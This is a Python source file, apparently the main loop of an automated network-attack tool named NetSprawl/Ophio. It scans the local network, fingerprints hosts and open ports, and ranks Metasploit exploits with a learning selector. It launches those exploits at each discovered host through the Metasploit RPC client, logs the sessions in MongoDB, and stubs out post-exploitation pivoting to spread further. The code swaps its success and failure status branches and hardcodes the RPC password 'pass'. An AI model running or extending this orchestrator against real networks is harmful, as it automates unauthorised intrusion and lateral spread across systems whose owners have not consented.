import Identifier
import Enricher
import Selector
import Exploiter
from record import Record

from pymongo import MongoClient, ReturnDocument
from metasploit.msfrpc import MsfRpcClient

import json
import time
import copy
import logging

def main():
    ### setup
    # initialize structures for orchestration
    # connect to database
    # connect to msf rpc
    # initialize exploits + data for selector
    # initialize logging

    dbClient = MongoClient()
    dbRef = dbClient["NetSprawl"]
    netMapTable = dbRef["Map"]
    exploitTable = dbRef["Exploits"] # TODO export weights from Selector

    msfClient = MsfRpcClient("pass")

    hostCollection = []
    rootHost = None

    enrichQueue = []
    exploitQueue = []
    postexQueue = []

    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())

    logger = logging.getLogger("Ophio")
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("ophio.log")
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    logger.addHandler(fh)
    logger.addHandler(ch)



    # main loop
    while True:
        ### identifier
        # call scanCurrentNetwork on initial host
        # log results of scan
        # identify root node
        # add host records to database

        logger.info("Identifying...")
        if len(enrichQueue) == 0: # can skip if prev cycle has identified new hosts
            identifyResults = json.loads(Identifier.scanCurrentNetwork())
            rootInterfaces = []
            hostsDiscovered = []
            for network in identifyResults:
                rootInterfaces.append(network["network"])
                for hostIp in network["hosts"]:
                    hostsDiscovered.append(hostIp)

        if rootHost == None:
            rootHost = Record(rootInterfaces, None)
            rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
            rootHost.exploitStatus["exploitUsed"] = "N/A"
            record = rootHost.toDict()
            netMapTable.insert(record)
            rootHost.id = record["_id"]
            hostCollection.append(rootHost)
            enrichQueue.append(rootHost)

        for hostIp in hostsDiscovered:
            uniqueIp = True
            for record in hostCollection:
                if hostIp in record.interfaces:
                    uniqueIp = False

            if uniqueIp:
                hostRecord = Record([hostIp], rootHost.id)
                record = hostRecord.toDict()
                netMapTable.insert(record)
                hostRecord.id = record["_id"]
                hostCollection.append(hostRecord)
                enrichQueue.append(hostRecord)



        ### enricher
        # call scanHostsForInfo on list of hosts, excluding self
        # log results of scans
        # append information to host records in database

        print("Enriching...")
        while len(enrichQueue) > 0:
            hostRecord = enrichQueue.pop()
            if(hostRecord.interfaces == '[]'):
                print("No Interfaces found")
                return
            enrichResults = json.loads(Enricher.scanHostsForInfo(hostRecord.interfaces)[0])
            # TODO concatenate results if there are multiple interfaces on a host
            hostRecord.os = enrichResults[0]
            hostRecord.openPorts = enrichResults[1:] if len(enrichResults) > 1 else []
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        'os': hostRecord.os,
                        'openPorts': hostRecord.openPorts
                    }
                 }
            )
            exploitQueue.append(hostRecord)



        ### selector/exploiter
        # call search on enriched host data
        # attempt exploits in recommended order
        # log results and update selector after each exploit run
        # append exploit status (exploit used, MS session) to host records

        print("Exploiting...")
        while len(exploitQueue) > 0:
            hostRecord = exploitQueue.pop()
            localIp = rootHost.interfaces[0]
            targetIp = hostRecord.interfaces[0]
            hostData = copy.copy(hostRecord.openPorts)
            hostData.insert(0, hostRecord.os)
            exploitOrder = strategy.search(hostData)

            for exploit in exploitOrder:
                try:
                    exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
                    exploitSuccess = exploitResults["job_id"] != None
                except:
                    print("Exploit {} failed abnormally.".format(exploit))
                    exploitSuccess = False
                strategy.update(hostData, exploit, exploitSuccess)
                if exploitSuccess:
                    break

            if exploitSuccess:
                hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
            else:
                hostRecord.exploitStatus = {
                    "statusCode": Record.STATUS_SUCCESS,
                    "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
                    "msSessionId": exploitResults["job_id"]
                }
            # TODO make sure this update works
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        "exploitStatus": hostRecord.exploitStatus
                    }
                }
            )
            postexQueue.append(hostRecord)



        ### post-exploits
        # drop and run identifier on exploited boxes
        # add new hosts to records + database
        # enrich and exploit new hosts as usual

        print("Postexploiting...")
        while len(postexQueue) > 0:
            hostRecord = postexQueue.pop()
            print(hostRecord)
            # TODO modify networking as needed
            # TODO scan for new hosts
            # add results to enricher queue



        ### repetition
        # identifiers should be rerun periodically to identify new hosts
        # alternative: run once, and restore state from DB info on startup
        print("Reached end of cycle.")
        # TODO save exploiter weights to database
        # TODO organize data for reports/next cycle
        if len(enrichQueue) == 0:
            print("Nothing new to scan. Sleeping.")
            time.sleep(60)



        ### logging and reporting
        # writing activities to a log file from lifecycle is a decent start
        # function (seperate script?) to produce report on network map & status from memory state or db records

if __name__ == '__main__':
    main()
